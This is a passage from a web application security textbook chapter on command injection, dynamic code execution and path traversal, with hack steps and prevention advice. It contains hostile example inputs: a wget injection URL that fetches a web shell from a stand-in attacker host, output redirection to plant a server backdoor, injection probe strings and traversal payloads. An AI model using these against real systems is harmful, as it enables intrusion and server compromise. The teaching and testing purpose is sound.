root, which you can then retrieve directly using your browser. For example:
dir > c:\inetpub\wwwroot\foo.txt
5. When you have found a means of injecting commands and retrieving the
results, you should determine your privilege level (by using whoami or
something similar, or attempting to write a harmless file to a protected
directory). You may then seek to escalate privileges, gain backdoor access
to sensitive application data, or attack other hosts reachable from the
compromised server.
cc1100..iinndddd 336644 88//1199//22001111 1122::1100::4466 PPMM
Stuttard c10.indd V2 - 07/05/2011 Page 365
Chapter 10 n Attacking Back-End Components 365
In some cases, it may not be possible to inject an entirely separate com-
mand due to fi ltering of required characters or the behavior of the command
API being used by the application. Nevertheless, it may still be possible to
interfere with the behavior of the command being performed to achieve
some desired result.
In one instance seen by the authors, the application passed user input
to the operating system command nslookup to fi nd the IP address of a
domain name supplied by the user. The metacharacters needed to inject new
commands were being blocked, but the  characters used to redirect
the command’s input and output were allowed. The nslookup command
usually outputs the IP address for a domain name, which did not seem to
provide an effective attack vector. However, if an invalid domain name is
supplied, the command outputs an error message that includes the domain
name that was looked up. This behavior proved suffi cient to deliver a
serious attack:
n Submit a fragment of server-executable script code as the domain name
to be resolved. The script can be encapsulated in quotes to ensure that
the command interpreter treats it as a single token.
n Use the > character to redirect the command’s output to a fi le in an execut-
able folder within the web root. The command executed by the operating
system is as follows:
nslookup “[script code]” > [/path/to/executable_file]
n When the command is run, the following output is redirected to the execut-
able fi le:
** server can’t find [script code]: NXDOMAIN
n This fi le can then be invoked using a browser, and the injected script
code is executed on the server. Because most scripting languages allow
pages to contain a mix of client-side content and server-side markup,
the parts of the error message that the attacker does not control are
just treated as plain text, and the markup within the injected script is
executed. The attack therefore succeeds in leveraging a restricted com-
mand injection condition to introduce an unrestricted backdoor into the
application server.
TRY IT!
http://mdsec.net/admin/18/
cc1100..iinndddd 336655 88//1199//22001111 1122::1100::4477 PPMM
Stuttard c10.indd V2 - 07/05/2011 Page 366
366 Chapter 10 n Attacking Back-End Components
HACK STEPS
1. The  characters are used, respectively, to direct the contents of a
file to the command’s input and to direct the command’s output to a file.
If it is not possible to use the preceding techniques to inject an entirely
separate command, you may still be able to read and write arbitrary file
contents using the  characters.
2. Many operating system commands that applications invoke accept a num-
ber of command-line parameters that control their behavior. Often, user-
supplied input is passed to the command as one of these parameters, and
you may be able to add further parameters simply by inserting a space
followed by the relevant parameter. For example, a web-authoring appli-
cation may contain a function in which the server retrieves a user-speci-
fied URL and renders its contents in-browser for editing. If the application
simply calls out to the wget program, you may be able to write arbitrary
file contents to the server’s filesystem by appending the -O command-line
parameter used by wget. For example:
url=http://wahh-attacker.com/%20-O%20c:\inetpub\wwwroot\scripts\
cmdasp.asp
TIP Many command injection attacks require you to inject spaces to sepa-
rate command-line arguments. If you fi nd that spaces are being fi ltered by
the application, and the platform you are attacking is UNIX-based, you may
be able to use the $IFS environment variable instead, which contains the
whitespace fi eld separators.
Finding Dynamic Execution Vulnerabilities
Dynamic execution vulnerabilities most commonly arise in languages such
as PHP and Perl. But in principle, any type of application platform may pass
user-supplied input to a script-based interpreter, sometimes on a different
back-end server.
cc1100..iinndddd 336666 88//1199//22001111 1122::1100::4477 PPMM
Stuttard c10.indd V2 - 07/05/2011 Page 367
Chapter 10 n Attacking Back-End Components 367
HACK STEPS
1. Any item of user-supplied data may be passed to a dynamic execution
function. Some of the items most commonly used in this way are the
names and values of cookie parameters and persistent data stored in user
profiles as the result of previous actions.
2. Try submitting the following values in turn as each targeted parameter:
;echo%20111111
echo%20111111
response.write%20111111
:response.write%20111111
3. Review the application’s responses. If the string 111111 is returned on its
own (is not preceded by the rest of the command string), the application
is likely to be vulnerable to the injection of scripting commands.
4. If the string 111111 is not returned, look for any error messages that indi-
cate that your input is being dynamically executed and that you may need
to fine-tune your syntax to achieve injection of arbitrary commands.
5. If the application you are attacking uses PHP, you can use the test string
phpinfo(), which, if successful, returns the configuration details of the
PHP environment.
6. If the application appears to be vulnerable, verify this by injecting some
commands that result in time delays, as described previously for OS com-
mand injection. For example:
system(‘ping%20127.0.0.1’)
Preventing OS Command Injection
In general, the best way to prevent OS command injection fl aws from arising
is to avoid calling out directly to operating system commands. Virtually any
conceivable task that a web application may need to carry out can be achieved
using built-in APIs that cannot be manipulated to perform commands other
than the one intended.
If it is considered unavoidable to embed user-supplied data into command
strings that are passed to an operating system command interpreter, the appli-
cation should enforce rigorous defenses to prevent a vulnerability from arising.
If possible, a whitelist should be used to restrict user input to a specifi c set of
expected values. Alternatively, the input should be restricted to a very narrow
character set, such as alphanumeric characters only. Input containing any other
data, including any conceivable metacharacter or whitespace, should be rejected.
cc1100..iinndddd 336677 88//1199//22001111 1122::1100::4477 PPMM
Stuttard c10.indd V2 - 07/05/2011 Page 368
368 Chapter 10 n Attacking Back-End Components
As a further layer of protection, the application should use command APIs
that launch a specifi c process via its name and command-line parameters,
rather than passing a command string to a shell interpreter that supports
command chaining and redirection. For example, the Java API Runtime.exec
and the ASP.NET API Process.Start do not support shell metacharacters.
If used properly, they can ensure that only the command intended by the
developer will be executed. See Chapter 19 for more details of command
execution APIs.
Preventing Script Injection Vulnerabilities
In general, the best way to avoid script injection vulnerabilities is to not pass
user-supplied input, or data derived from it, into any dynamic execution or
include functions. If this is considered unavoidable for some reason, the rel-
evant input should be strictly validated to prevent any attack from occurring.
If possible, use a whitelist of known good values that the application expects,
and reject any input that does not appear on this list. Failing that, check the
characters used within the input against a set known to be harmless, such as
alphanumeric characters excluding whitespace.
Manipulating File Paths
Many types of functionality commonly found in web applications involve pro-
cessing user-supplied input as a fi le or directory name. Typically, the input is
passed to an API that accepts a fi le path, such as in the retrieval of a fi le from the
local fi lesystem. The application processes the result of the API call within its
response to the user’s request. If the user-supplied input is improperly validated,
this behavior can lead to various security vulnerabilities, the most common of
which are fi le path traversal bugs and fi le inclusion bugs.
Path Traversal Vulnerabilities
Path traversal vulnerabilities arise when the application uses user-controllable
data to access fi les and directories on the application server or another back-
end fi lesystem in an unsafe way. By submitting crafted input, an attacker may
be able to cause arbitrary content to be read from, or written to, anywhere on
the fi lesystem being accessed. This often enables an attacker to read sensitive
information from the server, or overwrite sensitive fi les, ultimately leading to
arbitrary command execution on the server.
cc1100..iinndddd 336688 88//1199//22001111 1122::1100::4477 PPMM
Stuttard c10.indd V2 - 07/05/2011 Page 369
Chapter 10 n Attacking Back-End Components 369
Consider the following example, in which an application uses a dynamic
page to return static images to the client. The name of the requested image is
specifi ed in a query string parameter:
http://mdsec.net/filestore/8/GetFile.ashx?filename=keira.jpg
When the server processes this request, it follows these steps:
1. Extracts the value of the filename parameter from the query string.
2. Appends this value to the prefi x C:\filestore\.
3. Opens the fi le with this name.
4. Reads the fi le’s contents and returns it to the client.
The vulnerability arises because an attacker can place path traversal sequences
into the fi lename to backtrack up from the directory specifi ed in step 2 and
therefore access fi les from anywhere on the server that the user context used by
the application has privileges to access. The path traversal sequence is known
as “dot-dot-slash”; a typical attack looks like this:
http://mdsec.net/filestore/8/GetFile.ashx?filename=..\windows\win.ini
When the application appends the value of the filename parameter to the
name of the images directory, it obtains the following path:
C:\filestore\..\windows\win.ini
The two traversal sequences effectively step back up from the images direc-
tory to the root of the C: drive, so the preceding path is equivalent to this:
C:\windows\win.ini
Hence, instead of returning an image fi le, the server actually returns a default
Windows confi guration fi le.
NOTE In older versions of Windows IIS web server, applications would, by
default, run with local system privileges, allowing access to any readable fi le
on the local fi lesystem. In more recent versions, in common with many other
web servers, the server’s process by default runs in a less privileged user
context. For this reason, when probing for path traversal vulnerabilities, it is
best to request a default fi le that can be read by any type of user, such as
c:\windows\win.ini.
In this simple example, the application implements no defenses to prevent
path traversal attacks. However, because these attacks have been widely known
cc1100..iinndddd 336699 88//1199//22001111 1122::1100::4477 PPMM
Stuttard c10.indd V2 - 07/05/2011 Page 370
370 Chapter 10 n Attacking Back-End Components
about for some time, it is common to encounter applications that implement
various defenses against them, often based on input validation fi lters. As
you will see, these fi lters are often poorly designed and can be bypassed by a
skilled attacker.
TRY IT!
http://mdsec.net/filestore/8/
Finding and Exploiting Path Traversal Vulnerabilities
Many kinds of functionality require a web application to read from or write to
a fi lesystem on the basis of parameters supplied within user requests. If these
operations are carried out in an unsafe manner, an attacker can submit crafted
input that causes the application to access fi les that the application designer
did not intend it to access. Known as pathtraversal vulnerabilities, such defects
may enable the attacker to read sensitive data including passwords and appli-
cation logs, or to overwrite security-critical items such as confi guration fi les
and software binaries. In the most serious cases, the vulnerability may enable
an attacker to completely compromise both the application and the underlying
operating system.
Path traversal fl aws are sometimes subtle to detect, and many web applications
implement defenses against them that may be vulnerable to bypasses. We will
describe all the various techniques you will need, from identifying potential
targets, to probing for vulnerable behavior, to circumventing the application’s
defenses, to dealing with custom encoding.
Locating Targets for Attack
During your initial mapping of the application, you should already have identifi ed
any obvious areas of attack surface in relation to path traversal vulnerabilities.
Any functionality whose explicit purpose is uploading or downloading fi les
should be thoroughly tested. This functionality is often found in work fl ow
applications where users can share documents, in blogging and auction appli-
cations where users can upload images, and in informational applications
where users can retrieve documents such as ebooks, technical manuals, and
company reports.
In addition to obvious target functionality of this kind, various other types
of behavior may suggest relevant interaction with the fi lesystem.
cc1100..iinndddd 337700 88//1199//22001111 1122::1100::4477 PPMM
Stuttard c10.indd V2 - 07/05/2011 Page 371
Chapter 10 n Attacking Back-End Components 371
HACK STEPS
1. Review the information gathered during application mapping to identify
the following:
n Any instance where a request parameter appears to contain the name
of a fi le or directory, such as include=main.inc or template=/en/
sidebar.
n Any application functions whose implementation is likely to involve
retrieval of data from a server fi lesystem (as opposed to a back-end
database), such as the displaying of offi ce documents or images.
2. During all testing you perform in relation to every other kind of vulner-
ability, look for error messages or other anomalous events that are
of interest. Try to find any evidence of instances where user-supplied
data is being passed to file APIs or as parameters to operating system
commands.
TIP If you have local access to the application (either in a whitebox testing exer-
cise or because you have compromised the server’s operating system), identify-
ing targets for path traversal testing is usually straightforward, because you can
monitor all fi lesystem interaction that the application performs.
HACK STEPS
If you have local access to the web application, do the following:
1. Use a suitable tool to monitor all filesystem activity on the server. For
example, the FileMon tool from SysInternals can be used on the Windows
platform, the ltrace/strace tools can be used on Linux, and the truss
command can be used on Sun’s Solaris.
2. Test every page of the application by inserting a single unique string (such
astraversaltest) into each submitted parameter (including all cookies,
query string fields, and POST data items). Target only one parameter at a
time, and use the automated techniques described in Chapter 14 to speed
up the process.
3. Set a filter in your filesystem monitoring tool to identify all filesystem
events that contain your test string.
4. If any events are identified where your test string has been used as or
incorporated into a file or directory name, test each instance (as described
next) to determine whether it is vulnerable to path traversal attacks.
cc1100..iinndddd 337711 88//1199//22001111 1122::1100::4477 PPMM
Stuttard c10.indd V2 - 07/05/2011 Page 372
372 Chapter 10 n Attacking Back-End Components
Detecting Path Traversal Vulnerabilities
Having identifi ed the various potential targets for path traversal testing, you
need to test every instance individually to determine whether user-controllable
data is being passed to relevant fi lesystem operations in an unsafe manner.
For each user-supplied parameter being tested, determine whether traversal
sequences are being blocked by the application or whether they work as expected.
An initial test that is usually reliable is to submit traversal sequences in a way
that does not involve stepping back above the starting directory.
HACK STEPS
1. Working on the assumption that the parameter you are targeting is being
appended to a preset directory specified by the application, modify the
parameter’s value to insert an arbitrary subdirectory and a single traversal
sequence. For example, if the application submits this parameter:
file=foo/file1.txt
try submitting this value:
file=foo/bar/../file1.txt
If the application’s behavior is identical in the two cases, it may be vul-
nerable. You should proceed directly to attempting to access a different
file by traversing above the start directory.
2. If the application’s behavior is different in the two cases, it may be block-
ing, stripping, or sanitizing traversal sequences, resulting in an invalid file
path. You should examine whether there are any ways to circumvent the
application’s validation filters (described in the next section).
The reason why this test is effective, even if the subdirectory “bar” does
not exist, is that most common filesystems perform canonicalization of
the file path before attempting to retrieve it. The traversal sequence can-
cels out the invented directory, so the server does not check whether it is
present.
If you fi nd any instances where submitting traversal sequences without step-
ping above the starting directory does not affect the application’s behavior, the
next test is to attempt to traverse out of the starting directory and access fi les
from elsewhere on the server fi lesystem.
cc1100..iinndddd 337722 88//1199//22001111 1122::1100::4477 PPMM